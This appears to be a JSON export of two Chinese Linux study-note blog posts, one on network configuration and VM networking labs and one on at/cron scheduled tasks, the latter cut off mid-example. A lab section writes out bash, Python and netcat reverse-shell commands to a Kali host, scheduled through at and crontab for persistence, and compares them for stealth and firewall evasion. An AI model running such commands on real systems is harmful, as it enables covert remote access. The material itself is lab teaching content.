[{"id":"211ca85a2e196056b84f487853fdec80","title":"网络管理","content":"网络管理一、基本概念1、物理网卡（NIC, Network Interface Card）​\t硬件实体：插在主板或扩展槽上的设备（如 Intel千兆网卡、Realtek 无线网卡）。\n​\t功能：\n​\t\t负责物理层（PHY）信号传输（如电信号、光信号）。\n​\t\t支持数据链路层（MAC 地址、帧封装）的基础操作。\n2、网络适配器（Adapter）​\t软件抽象：Windows 系统中驱动程序与服务的集合，管理网卡硬件。\n​\t功能：\n​\t\t加载网卡驱动，提供 API 接口供操作系统调用。\n​\t\t处理网络协议（如 TCP&#x2F;IP）、虚拟化支持（如 Hyper-V 的虚拟网卡）。\n​\t\t在设备管理器中显示为“网络适配器”条目。\n3、DHCP（Dynamic Host Configuration Protocol）动态主机配置协议1.核心功能​\t自动分配 IP 地址：在局域网内自动为设备分配 IP&#x2F;MAC 绑定信息（如 192.168.1.100 ）。\n​\t配置同步：自动设置子网掩码、网关、DNS 服务器等参数。\n​\t租约管理：IP 地址租用期限（如 86400 秒），到期后自动续租或回收。\n2.典型应用场景​\t动态网络：办公室、家庭 Wi-Fi，设备频繁变动（如手机、平板接入）。\n​\t虚拟化环境：VMware&#x2F;Kubernetes 中的虚拟机自动获取 IP。\n​\t服务部署：快速部署临时服务器，无需手动配置 IP。\n4、静态地址（Static IP Address）1.核心特征​\t手动配置：固定 IP 地址（如 192.168.1.100 ），不会因网络变化而改变。\n​\t高稳定性：适用于需要长期稳定访问的服务（如 Web 服务器、数据库）。\n2.典型应用场景​\t生产服务器：确保外部用户始终通过固定 IP 访问服务。\n​\t网络设备：路由器、防火墙等需要固定 IP 的设备。\n​\t内网穿透：在 NAT 环境中，为特定服务分配静态内网 IP。\n5、DNS（Domain Name System）域名系统1.核心功能​\t域名解析：将人类可读的域名（如 google.com ）转换为 IP 地址（如 &#96;172.217.14.104）。\n​\t支持正向&#x2F;反向解析：\n​\t\t正向解析：域名 → IP\n​\t\t反向解析：IP → 域名\n2.典型应用场景​\t访问互联网服务：浏览器、邮件客户端依赖 DNS 解析域名。\n​\t内部网络管理：企业内网域名解析（如 mail.example.com ）。\n​\t负载均衡：通过 DNS 轮询实现流量分发。\n6、linux中常见网络接口类型及缩写标识解析\n7、Windows 中的“网络适配器”分类\n8、路由转发路由转发（IP Forwarding）是计算机网络中的核心机制，指 路由器或具备路由功能的设备根据路由表 将接收到的数据包转发到目标网络。以下是详细解析：\n1.核心概念​\t路由表（Routing Table）：  \n​\t存储网络地址与下一跳信息的表格，决定数据包的转发路径。 \n​\t示例条目：\n12目标网络      下一跳IP      接口      标记192.168.1.0/24  10.0.0.1  eth0      UG\n\n​\t下一跳（Next Hop）： \n​\t数据包转发的下一个设备或网关的 IP 地址。 \n​\t路由协议（如 OSPF、BGP）：  \n​\t动态更新路由表的协议，适用于大型网络（如企业网或互联网）。\n2.路由转发的工作流程（1）接收数据包：​\t\t设备收到来自本地网络的数据包（如 192.168.1.5 → 8.8.8.8 ）。\n（2）路由表查询：​\t\t检查目标地址 8.8.8.8 是否属于本地网络。\n​\t\t\t若是：直接交付给目标主机。\n​\t\t\t若否：查找路由表中匹配的条目。\n（3）数据包转发：​\t\t修改数据包的 TTL（生存时间） 和 校验和。\n​\t\t将数据包发送到下一跳设备（如网关 10.0.0.1 ）。\n（4）递归转发：​\t\t下一跳设备重复上述过程，直至数据包到达最终目的地\n3.路由转发的关键场景（1）内部网络访问外部网络​\t场景：公司内网（192.168.1.0&#x2F;24 ）通过路由器（10.0.0.1 ）访问互联网（ 8.8.8.8 ）。\n​\t路由表配置：\n12# 添加默认网关（互联网出口）sudo ip route add default via 10.0.0.1 dev eth0\n\n（2）数据中心流量调度​\t场景：多个服务器（10.0.1.1、10.0.1.2 ）通过负载均衡器（10.0.0.1 ）分发流量。\n​\t路由策略：基于流量权重或服务器状态动态选择下一跳。\n（3）VPN 隧道​\t场景：远程办公用户通过 VPN 隧道（如 172.16.0.0&#x2F;16 ）访问公司内网。\n​\t路由表配置：\n12# 添加 VPN 路径sudo ip route add 172.16.0.0/16 via 10.0.0.1 dev tun0\n\n4.路由转发的配置方法（1）Linux 系统（使用 ip 命令）12345678# 查看路由表ip route show# 添加静态路由（目标网络→下一跳→接口）sudo ip route add 192.168.2.0/24 via 10.0.0.2 dev eth1# 删除路由sudo ip route del 192.168.2.0/24\n\n（2） 配置文件持久化​\t路径： /etc/sysconfig/network-scripts/route-eth0 （针对接口 eth0  \n​\t&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-ensxxx \n​\t示例内容：\n12to default via 10.0.0.1 dev eth0to 192.168.2.0/24 via 10.0.0.2 dev eth1\n\n二、虚拟机的网络连接方式1、NAT（ 网络地址转换）\n工作原理​\tNAT模式（网络地址转换模式，Network Address Translation）允许虚拟机通过主机访问外部网络（如互联网），但外部网络无法直接访问虚拟机。其工作原理主要是通过主机充当虚拟机的“网关”来实现网络地址转换。\n1.虚拟机的私有网络：​\t在 NAT 模式下，虚拟机会被分配一个私有 IP 地址（如 192.168.x.x 或 10.x.x.x），这个 IP 地址只能在虚拟机和主机之间有效，并且与外部网络隔离。\n2.虚拟机请求外部网络：​\t当虚拟机需要访问外部网络（如互联网）时，它会把数据包通过虚拟网卡发送给主机。\n​\t数据包的源 IP 地址是虚拟机的私有 IP 地址，而目标地址是外部网络的某个设备（例如某个网站的服务器 IP）。\n3.主机进行 NAT 转换：​\t主机充当，NAT 路由器，将来自虚拟机的数据包进行，网络地址转换。      \n​\t\t将数据包中的源 IP 地址从虚拟机的私有 IP 地址转换为主机的公网 IP 地址。\n​\t\t保留虚拟机的端口信息，以便将返回数据正确转发给虚拟机。\n4.数据包发送至外部网络：​\t主机将已经替换源 IP 的数据包发送到外部网络（例如互联网）。\n​\t外部服务器只看到数据包的源地址为主机的公网 IP，而不知道虚拟机的私有 IP。\n5.外部网络响应数据：​\t外部服务器将响应数据包发送回主机的公网 IP。\n​\t主机接收到响应后，使用 NAT 表将数据包中的目标 IP 地址重新转换回虚拟机的私有 IP 地址。\n6.主机将数据包转发给虚拟机：​\t主机将响应数据包转发给对应的虚拟机，虚拟机接收到外部网络的数据包后完成通信。\n​\t\tNAT模式下，主机是虚拟的路由器，而虚拟机是一台私有网络中的机器。而既然是私有网络中的机器，那就和私有网络IP地址有关\n2、桥接模式（独立主机）桥接模式允许虚拟机与主机网络以及外部网络完全独立地通信，虚拟机就像是网络中的一台独立主机， 具有自己的 IP 地址。\n工作原理1.网络连接：​\t在桥接模式下，虚拟机的网络适配器与主机的物理网卡（例如以太网适配器或无线适配器）相连 接。这种连接模拟了虚拟机与局域网中的一台独立设备直接相连的情况。 \n2.获取 IP 地址：​\t虚拟机启动后，会通过 DHCP（动态主机配置协议）从网络中的 DHCP 服务器获取一个 独立的 IP  地址。这个 IP 地址与局域网中的其他设备位于同一子网内，确保虚拟机可以与其他设备直接通 信。 \n3.数据链路层通信：​\t虚拟机和其他网络设备之间的通信是在数据链路层（Layer 2）进行的。虚拟机使用 MAC 地址进行 识别和通信。 \n​\t当虚拟机发送数据包时，它会将数据包发送到主机的物理网卡。由于虚拟机的网络适配器与主机的 网卡桥接，数据包将直接转发到局域网。\n3、主机模式（子主机）主机模式将虚拟机完全隔离在主机的网络中，虚拟机只能与主机通信，无法访问外部网络，也无法与其 他局域网设备通信。\n工作原理1.虚拟网络适配器：​\t在主机模式下，虚拟机通过一个虚拟网络适配器与主机进行连接。这个虚拟适配器形成了一个独立 的局域网，仅包含主机和虚拟机，完全隔离于外部网络。 \n2.IP 地址分配：​\t主机和虚拟机在这个私有网络中都有各自的 IP 地址。主机的虚拟网络适配器通常会为虚拟机分配 一个私有 IP 地址（ 例如 192.168.x.x ）。这个 IP 地址只在主机和虚拟机之间有效，外部网络无法 访问。 \n3.数据传输：​\t当虚拟机需要与主机通信时，它通过虚拟网络适配器发送数据包。这些数据包只在主机和虚拟机之 间进行转发。 \n​\t主机和虚拟机之间的通信是在数据链路层（Layer 2）进行的，使用 MAC 地址进行识别和处理。\n三、网络配置1、网络服务-网络管理器（NetworkManager）网络管理器（NetworkManager）是一个动态网络的控制器与配置系统，它用于当网络设备可用时保持设备和连接开启并激活 \n默认情况下，CentOS8 已安装网络管理器，并处于启用状态。\n​\t查看网络管理程序的状态\n1systemctl status NetworkManager\n\n​\t查看网络子管理程序的状态\n1systemctl status network   老版（centos 6之前）\n\n2、配置网络的方法配置文件：vim1[root@localhost ~]# vim /etc/sysconfig/network-scripts/ifcfg-ens160\n\n命令行： nmcli​\t如果没有这个命令，可以执行安装 yum -y install NetworkManager \n图形配置​\t简易图形： nmtui \n​\t图形界面：nm-connection-editor\n3、配置网络参数实验：将虚拟机网卡设置为桥接模式，配置静态地址后能够访问外网 \n1.纯命令行配置静态 IP（无需依赖 NetworkManager 或  systemd-networkd ，重启失效）（1）查看当前网络状态1234567891011121314151617181920212223242526272829303132333435363738394041[root@wyf ~]# ip addr                     NetworkManager 或 systemd-networkd ，重启失效） # 查看 IP、子网、网关等信息1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00inet 127.0.0.1/8 scope host lovalid_lft forever preferred_lft foreverinet6 ::1/128 scope host valid_lft forever preferred_lft forever2: ens160: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000link/ether 00:0c:29:5c:a4:ed brd ff:ff:ff:ff:ff:ffinet 192.168.119.128/24 brd 192.168.119.255 scope global dynamic noprefixroute ens160valid_lft 1522sec preferred_lft 1522secinet6 fe80::ac23:8439:4329:9fe2/64 scope link noprefixroute valid_lft forever preferred_lft forever3: ens192: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000link/ether 00:0c:29:5c:a4:f7 brd ff:ff:ff:ff:ff:ffinet 192.168.1.23/24 brd 192.168.1.255 scope global dynamic noprefixroute ens192valid_lft 258922sec preferred_lft 258922secinet6 fe80::4d93:c232:2460:e4f3/64 scope link noprefixroute valid_lft forever preferred_lft forever[root@wyf ~]# ip route                    # 查看路由表default via 192.168.119.2 dev ens160 proto dhcp metric 100 default via 192.168.1.1 dev ens192 proto dhcp metric 101 192.168.1.0/24 dev ens192 proto kernel scope link src 192.168.1.23 metric 101 192.168.119.0/24 dev ens160 proto kernel scope link src 192.168.119.128 metric 100 #ens160 的网关 192.168.119.2 是 NAT 模式下的宿主机网关。#ens192 的网关 192.168.1.1 是桥接模式下的宿主机网关[root@wyf ~]# cat /etc/resolv.conf       # 查看 DNS 配置# Generated by NetworkManagernameserver 114.114.114.114nameserver 192.168.1.1\n\n（2）手动分配静态 IP​\t查看物理机 IP ，确保虚拟机和物理机处于同一网段\n1[root@wyf ~]# ip addr add 192.168.1.100/24 dev ens192  # 分配静态 IP + 子网掩码\n\n​\t验证：ping 物理机地址\n12[root@wyf ~]# ip addr show ens192 |grep 192.168.1.100inet 192.168.1.100/24 scope global secondary ens192  # 确认 IP 已分配\n\n（3）设置默认网关1[root@wyf ~]# ip route add default via 192.168.1.1 dev ens192  # 添加默认路由\n\n​\t验证：\n123456[root@wyf ~]# ping -c4 8.8.8.8                        #谷歌的dns  PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.64 bytes from 8.8.8.8: icmp_seq=1 ttl=53 time=127 ms64 bytes from 8.8.8.8: icmp_seq=2 ttl=53 time=50.7 ms64 bytes from 8.8.8.8: icmp_seq=3 ttl=53 time=50.0 ms64 bytes from 8.8.8.8: icmp_seq=4 ttl=53 time=50.7 ms\n\n（4） 配置 DNS 服务器1234[root@wyf ~]# vim /etc/resolv.conf # Generated by NetworkManager# nameserver 192.168.1.1nameserver 114.114.114.114\n\n​\t验证：\n123456[root@xnha ~]# ping www.qq.com            # 测试 DNS 解析PING ins-r23tsuuf.ias.tencent-cloud.net (111.30.178.240) 56(84) bytes of data.64 bytes from 111.30.178.240 (111.30.178.240): icmp_seq=1 ttl=249 time=6.22 ms64 bytes from 111.30.178.240 (111.30.178.240): icmp_seq=2 ttl=249 time=6.74 ms64 bytes from 111.30.178.240 (111.30.178.240): icmp_seq=3 ttl=249 time=25.1 ms64 bytes from 111.30.178.240 (111.30.178.240): icmp_seq=4 ttl=249 time=6.15 ms\n\n（5）重启不失效的解决方案​\t将命令写进 &#x2F;etc&#x2F;rc.d&#x2F;rc.loca 配置文件 \n​\tetc&#x2F;rc.d 配置文件 是Linux 系统中与 初始化脚本（Init Scripts） 和 服务管理 相关的核心目录。 \n​\tetc&#x2F;rc.d&#x2F;rc.rclocal 是自定义启动命令的文件(开机启动脚本，基本已弃用)\n1234[root@wyf ~]# vim /etc/rc.d/rc.localip addr add 192.168.1.100/24 dev ens192ip route add default via 192.168.1.1echo &quot;namesever 114.114.114.114&quot;&gt;&gt; /etc/resolv.conf\n\n​\t保存退出后，给该文件添加执行权限\n1[root@wyf ~]# chmod +x /etc/rc.d/rc.local\n\n​\t重启后，配置成功，删除执行权限\n1[root@wyf~]# chmod -x /etc/rc.d/rc.local\n\n2.修改网卡的配置文件 &#x2F;etc&#x2F;sysconfig&#x2F;netword-scripts&#x2F;ifcfg-ensxx（1）先备份网卡配置信息，在修改​\t先备份网卡配置文件，在修改\n123456[root@wyf network-scripts]# lsifcfg-ens160  ifcfg-ens192[root@wyf network-scripts]# mv ifcfg-ens192 ifcfg-ens192.bak[root@wyf network-scripts]# touch ifcfg-ens192[root@wyf network-scripts]# lsifcfg-ens160  ifcfg-ens192  ifcfg-ens192.bak\n\n（2）编辑配置文件，每个参数都要背下来！！！​\t最简化配置参数\n\n（3）重启后验证123456789101112131415161718192021222324[root@wyf ~]# ip addr1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\tlink/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\tinet 127.0.0.1/8 scope host lo\t\tvalid_lft forever preferred_lft forever\tinet6 ::1/128 scope host \t\tvalid_lft forever preferred_lft forever2: ens160: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000\tlink/ether 00:0c:29:5c:a4:ed brd ff:ff:ff:ff:ff:ff3: ens192: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group efault qlen 1000\tlink/ether 00:0c:29:5c:a4:f7 brd ff:ff:ff:ff:ff:ff\tinet 192.168.1.100/24 brd 192.168.1.255 scope global noprefixroute ens192\t\tvalid_lft forever preferred_lft forever\tinet6 fe80::20c:29ff:fe5c:a4f7/64 scope link \t\tvalid_lft forever preferred_lft forever[root@wyf ~]# ping www.baidu.comPING www.a.shifen.com (39.156.70.239) 56(84) bytes of data.64 bytes from 39.156.70.239 (39.156.70.239): icmp_seq=1 ttl=53 time=10.8 ms64 bytes from 39.156.70.239 (39.156.70.239): icmp_seq=2 ttl=53 time=12.1 ms64 bytes from 39.156.70.239 (39.156.70.239): icmp_seq=3 ttl=53 time=10.7 ms64 bytes from 39.156.70.239 (39.156.70.239): icmp_seq=4 ttl=53 time=10.8 ms\n\n3.nmcli 命令配置IP（基于NetworkManager的管理工具） network &#x2F;etc&#x2F;sysconfig&#x2F;network scripts&#x2F;ifcfg-ensxx（1）查看所有网络连接1[root@wyf ~]# nmcli connection show\n\n​\t输出示例：\n123NAME           UUID                                  TYPE      DEVICE System ens192  03da7500-2101-c722-2438-d0d006c28c73  ethernet  ens192 ens160         aaca87e6-f62a-4693-a09b-1ac25d77b8f2  ethernet  --   \n\n（2）查看特定连接详情1nmcli connection show &quot;ens192&quot;\n\n（3）启用&#x2F;禁用接口12345# 启用 eth0nmcli connection up eth0# 禁用 wlan0nmcli connection down wlan0\n\n（4）配置静态 IP123456# 设置 eth0 为静态 IP 192.168.1.100/24，网关 192.168.1.1nmcli connection modify eth0 \\\ttype ethernet \\\tip4 192.168.1.100/24 \\\tgateway4 192.168.1.1 \\\tdns &quot;8.8.8.8;8.8.4.4&quot;\n\n（5）配置 DHCP1234# 设置 eth0 为 DHCP 自动获取 IPnmcli connection modify eth0 \\\ttype ethernet \\\tip4 auto dhcp\n\n4.nmtui-图形化配置\n四、实验1、实验一\n实验步骤\n1.给 VMware 添加两个虚拟网卡点击左上角编辑，找到虚拟网络编辑器，点击\n\n使用管理员权限进行修改，添加VMnet1和VMnet2两张虚拟网卡，将使用本地DHCP服务将IP地址分配给虚拟机取消掉\n\n\n完成后点击确定。\n2.配置 Windows10先修改Windows10虚拟机网络适配器配置，将其修改成VMnet2\n\n修改完成后点击确定，打开Windows10虚拟机，进去后找到右下角网络图标，右键，点击打开“网络和Internet”设置\n\n点击更改适配器选项\n\n右键点击Ethernet0，点击属性\n\n找到Internet协议版本4（TCP&#x2F;IPv4），点击属性\n\n修改IP地址，子网掩码，默认网关，点击确定\n\n现在win+R打开终端，输入ipconfig，可以看到IP地址信息\n\n3.配置 Kali先修改Kali虚拟机网络适配器配置，将其修改成VMnet3\n\n修改完成后点击确定，打开Kali虚拟机后，打开终端，进入&#x2F;etc&#x2F;network目录下\n12┌──(root㉿kali)-[/etc/network]└─# ls -l\n\n\n先备份interfaces文件为interfaces.back\n12┌──(root㉿kali)-[/etc/network]└─# mv interfaces interfaces.back\n\n\n新建一个interfaces文件，对其配置进行修改\n12┌──(root㉿kali)-[/etc/network]└─# vim interfaces\n\n12345auto eth0iface eth0 inet static    address 172.16.2.1    netmask 255.255.255.0    gateway 172.16.2.254\n\n重启Kali的networking.service\n12┌──(root㉿kali)-[/etc/network]└─# systemctl restart networking.service\n\n在终端输入ip a 可以看到IP发生改变\n\n4.配置 CentOS 8先修改CentOS 8 虚拟机网络适配器配置，将第一个修改成VMnet2，第二个修改成VMnet3\n\n修改后点击确定，打开CentOS 8 虚拟机，打开终端，进入&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts目录\n1234[root@wyf network-scripts]# ls -l总用量 8-rw-r--r--. 1 root root 312 7月  28 19:38 ifcfg-ens160-rw-r--r--. 1 root root 281 7月  28 19:38 ifcfg-ens192\n\n这是我们原先网卡的配置文件，先进行备份\n12[root@wyf network-scripts]# mv ifcfg-ens160 ifcfg-ens160.back[root@wyf network-scripts]# mv ifcfg-ens192 ifcfg-ens192.back\n\n新建 ifcfg-ens160 和 ifcfg-ens192 文件，用来存放ip配置\n12345678910111213141516[root@wyf network-scripts]# vim ifcfg-ens160TYPE=&quot;Ethernet&quot;BOOTPROTO=&quot;static&quot;DEFROUTE=&quot;yes&quot;NAME=&quot;ens160&quot;DEVICE=&quot;ens160&quot;IPADDR=192.168.2.254ONBOOT=&quot;yes&quot;[root@wyf network-scripts]# vim ifcfg-ens192TYPE=&quot;Ethernet&quot;BOOTPROTO=&quot;static&quot;DEFROUTE=&quot;yes&quot;NAME=&quot;ens192&quot;DEVICE=&quot;ens192&quot;IPADDR=172.16.2.254ONBOOT=&quot;yes&quot;\n\n1234567891011121314151617#原文件[root@wyf network-scripts]# cat ifcfg-ens160TYPE=&quot;Ethernet&quot;                                #指定网络接口类型为以太网   PROXY_METHOD=&quot;none&quot;                            #不使用代理服务器配置BROWSER_ONLY=&quot;no&quot;                              #不是浏览器专用连接BOOTPROTO=&quot;dhcp&quot;                               #指定自动获取IP地址DEFROUTE=&quot;yes&quot;                                 #将此接口设为默认路由出口IPV4_FAILURE_FATAL=&quot;no&quot;                        #IPv4连接失败不影响系统启动IPV6INIT=&quot;yes&quot;                                 #启用IPv6支持IPV6_AUTOCONF=&quot;yes&quot;                            #允许IPv6自动配置地址IPV6_DEFROUTE=&quot;yes&quot;                            #将此接口设为IPv6默认路由IPV6_FAILURE_FATAL=&quot;no&quot;                        #IPv6连接失败不影响系统启动IPV6_ADDR_GEN_MODE=&quot;stable-privacy&quot;            #IPv6地址使用稳定隐私模式生成NAME=&quot;ens160&quot;                                  #指定连接名称UUID=&quot;343088b5-d3dd-48e1-ad69-198d13db9d71&quot;    #此网络配置的唯一标识符DEVICE=&quot;ens160&quot;                                #指定此配置文件管理的物理设备名称ONBOOT=&quot;yes&quot;                                   #开机时自动激活此网络接口\n\n开启路由转发功能，修改文件&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward文件，默认是0，改为1（使用vim无法修改，这里使用echo）\n123[root@wyf ipv4]# echo 1 &gt; ip_forward[root@wyf ipv4]# cat ip_forward1\n\n\n特殊文件类型/proc/sys/ 下的文件不是普通磁盘文件，而是内核参数映射接口​\n权限限制即使 root 用户也不能直接用编辑器修改，必须通过系统工具写入\n写入要求只能接受特定数值（0或1），不接受文本编辑\n临时性修改通过 /proc 路径的修改在重启后会失效\n\n应用配置并重启网络\n12[root@wyf ipv4]# nmcli connection reload[root@wyf ipv4]# systemctl restart NetworkManager\n\n这是可以查看IP回显\n12345678910111213141516171819[root@wyf ipv4]# ip a1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00    inet 127.0.0.1/8 scope host lo       valid_lft forever preferred_lft forever    inet6 ::1/128 scope host        valid_lft forever preferred_lft forever2: ens160: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000    link/ether 00:0c:29:d0:f2:6b brd ff:ff:ff:ff:ff:ff    inet 192.168.2.254/24 brd 192.168.2.255 scope global noprefixroute ens160       valid_lft forever preferred_lft forever    inet6 fe80::20c:29ff:fed0:f26b/64 scope link        valid_lft forever preferred_lft forever3: ens192: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000    link/ether 00:0c:29:d0:f2:75 brd ff:ff:ff:ff:ff:ff    inet 172.16.2.254/16 brd 172.16.255.255 scope global noprefixroute ens192       valid_lft forever preferred_lft forever    inet6 fe80::20c:29ff:fed0:f275/64 scope link        valid_lft forever preferred_lft forever\n\n如果这里有网卡未显示ip，可以去右上角网络连接用图形化界面进行修改（最便捷的方法）\n5.验证使用 Windows10 来 ping Kali\n\n使用 Kali 来 ping Windows10\n\n证明192.168.2.1和172.16.2.1能够互通\n2、实验二1.使用一次性计划任务和周期性计划任务反弹shell（5分钟后执行，和每5分钟执行一次），Kali 主机接收，解释命令字的含义1234[root@wyf 桌面]# echo &quot;bash -i &gt;&amp; /dev/tcp/172.16.2.1/1234 0&gt;&amp;1&quot; | at now + 5 minwarning: commands will be executed using /bin/shjob 4 at Thu Aug  7 16:43:00 2025#创建一个一次性计划任务，在5分钟后执行反弹Shell操作 反弹目标：IP为172.16.2.1的Kali主机的1234端口\n\n\nbash -i：启动交互式Bash shell\n&amp; /dev/tcp/172.16.2.1/4444：\n&gt;&amp;：将标准输出(stdout)和标准错误(stderr)合并重定向\n/dev/tcp/172.16.2.1/4444：建立TCP连接到指定IP和端口（Linux内核特性）\n\n\n0&gt;&amp;1：将标准输入(stdin)重定向到标准输出，实现双向通信\nat now + 5 min：通过at命令安排在5分钟后执行\n\n\n12[root@wyf 桌面]# echo &quot;*/5 * * * * bash -c &#x27;bash -i &gt;&amp; /dev/tcp/172.16.2.1/1234 0&gt;&amp;1 &amp;&#x27;&quot; | crontab -\n\n1.echo命令输出字符串：”*&#x2F;5 * * * * bash -c ‘bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;172.16.2.1&#x2F;1234 0&gt;&amp;1 &amp;’” 这个字符串是一个cron作业的格式，包含两部分：\n\n时间计划：*/5 * * * * 表示每5分钟执行一次\n要执行的命令：bash -c &#39;bash -i &gt;&amp; /dev/tcp/172.16.2.1/1234 0&gt;&amp;1 &amp;&#39;\n\n2.管道符|将echo的输出作为标准输入传递给crontab -命令。\n3.crontab -命令：从标准输入读取内容，并将其设置为当前用户的cron表（替换现有的cron作业）。\n\n2.学习不同的反弹shell方式来完成方案 1: 使用 Python 反弹 Shell一次性计划任务（5 分钟后执行）\n1echo &quot;python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\&quot;172.16.2.1\\&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\&quot;/bin/sh\\&quot;,\\&quot;-i\\&quot;])&#x27;&quot; | at now + 5 min\n\n123456789101112# Python代码解析import socket,subprocess,os# 创建TCP sockets = socket.socket(socket.AF_INET, socket.SOCK_STREAM)# 连接到目标IP:端口（根据图片，目标Kali为172.16.2.1）s.connect((&quot;172.16.2.1&quot;, 4444))# 文件描述符重定向os.dup2(s.fileno(), 0)  # 标准输入(stdin)os.dup2(s.fileno(), 1)  # 标准输出(stdout)os.dup2(s.fileno(), 2)  # 标准错误(stderr)# 启动交互式Shellsubprocess.call([&quot;/bin/sh&quot;, &quot;-i&quot;])\n\n周期性计划任务（每 5 分钟执行）\n1(crontab -l 2&gt;/dev/null; echo &quot;*/5 * * * * python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\\\\&quot;172.16.2.1\\\\\\&quot;,5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\\\\&quot;/bin/bash\\\\\\&quot;,\\\\\\&quot;-i\\\\\\&quot;])&#x27;&quot;) | crontab -\n\n方案 2: 使用 Netcat 反弹 Shell一次性计划任务（5 分钟后执行）\n1echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 172.16.2.1 6666 &gt;/tmp/f&quot; | at now + 5 min\n\n周期性计划任务（每 5 分钟执行）\n1(crontab -l 2&gt;/dev/null; echo &quot;*/5 * * * * bash -c &#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 172.16.2.1 7777 &gt;/tmp/f&#x27;&quot;) | crontab -\n\nKali 主机监听命令为所有方案准备监听：\n1234567# Python Shell 监听nc -lnvp 4444    # 一次性任务nc -lnvp 5555    # 周期性任务# Netcat Shell 监听nc -lnvp 6666    # 一次性任务nc -lnvp 7777    # 周期性任务\n\n方案对比表\n\n\n特性\nPython 方案\nNetcat 方案\nBash 方案\n\n\n\n依赖要求\n需要 Python3\n需要 netcat\n仅需 Bash\n\n\n防火墙规避\n★★★ (直接 TCP)\n★★ (标准连接)\n★★ (标准连接)\n\n\n检测难度\n较难 (非标准方式)\n中等\n较易\n\n\n适用系统\nPython 环境\nnc 工具环境\n所有 Linux\n\n\n命令隐蔽性\n高\n中\n低\n\n\n","slug":"网络管理","date":"2025-08-07T02:21:43.000Z","categories_index":"","tags_index":"Linux","author_index":"wyf"},{"id":"3e7fe2ca73cd20125c7985e6b77d8968","title":"计划任务","content":"计划任务一、 计划任务概述1.1 什么是计划任务？​\t定义：在特定时间自动执行预先设定的命令或脚本。\n​\t核心用途：\n​\t\t延迟执行（如30秒后重启服务）。\n​\t\t周期性任务（如每日备份数据库、每小时同步数据）。\n​\t\t脱机任务（如无人值守服务器运维）。\n1.2 Linux中的两大工具\n1234567891011121314151617181920212223242526272829303132[root@wyf 桌面]# systemctl status atd.service ● atd.service - Job spooling tools   Loaded: loaded (/usr/lib/systemd/system/atd.service; enabled; vendor preset:&gt;   Active: active (running) since Wed 2025-08-06 15:30:49 CST; 4h 18min ago Main PID: 1421 (atd)    Tasks: 1 (limit: 23821)   Memory: 688.0K   CGroup: /system.slice/atd.service           └─1421 /usr/sbin/atd -f8月 06 15:30:49 wyf systemd[1]: Started Job spooling tools.[root@wyf 桌面]# systemctl status crond.service ● crond.service - Command Scheduler   Loaded: loaded (/usr/lib/systemd/system/crond.service; enabled; vendor prese&gt;   Active: active (running) since Wed 2025-08-06 15:30:49 CST; 4h 18min ago Main PID: 1423 (crond)    Tasks: 1 (limit: 23821)   Memory: 2.8M   CGroup: /system.slice/crond.service           └─1423 /usr/sbin/crond -n8月 06 16:01:02 wyf CROND[3215]: (root) CMD (run-parts /etc/cron.hourly)8月 06 16:01:02 wyf anacron[3224]: Anacron started on 2025-08-068月 06 16:01:02 wyf anacron[3224]: Will run job `cron.daily&#x27; in 10 min.8月 06 16:01:02 wyf anacron[3224]: Jobs will be executed sequentially8月 06 16:11:02 wyf anacron[3224]: Job `cron.daily&#x27; started8月 06 16:11:02 wyf anacron[3224]: Job `cron.daily&#x27; terminated8月 06 16:11:02 wyf anacron[3224]: Normal exit (1 job run)8月 06 17:01:01 wyf CROND[3892]: (root) CMD (run-parts /etc/cron.hourly)8月 06 18:01:01 wyf CROND[4464]: (root) CMD (run-parts /etc/cron.hourly)8月 06 19:01:01 wyf CROND[5973]: (root) CMD (run-parts /etc/cron.hourly)\n\n二、at 命令详解2.1 基本语法1at [选项] 时间表达式 [命令]\n\n​\t提交任务：输入命令后按 Ctrl+D 提交。\n​\t查看任务：atq（列出所有任务）。\n​\t删除任务：atrm &lt;任务ID&gt;。\n2.2 时间表达式​\t灵活时间格式：\n1234now        # 立即执行  now + 5min  # 5分钟后02:30 tomorrow/today  # 次日2:302025-12-31 23:59  # 绝对时间\n\n​\t示例：\n123[root@wyf 桌面]# at now +1 minuteswarning: commands will be executed using /bin/sh#该警告意味着计划任务必须使用内置命令\n\n​\t显示加载\n1234567891011[root@wyf 桌面]# at now +1 minuteswarning: commands will be executed using /bin/shat&gt; SHELL=/bin/bashat&gt; echo &quot;当前shell：  $(which bash)&quot; &gt;&gt; /tmp/at-test.txtat&gt; &lt;EOT&gt;                                                  # Ctrl D 退出job 1 at Wed Aug  6 19:53:00 2025[root@wyf 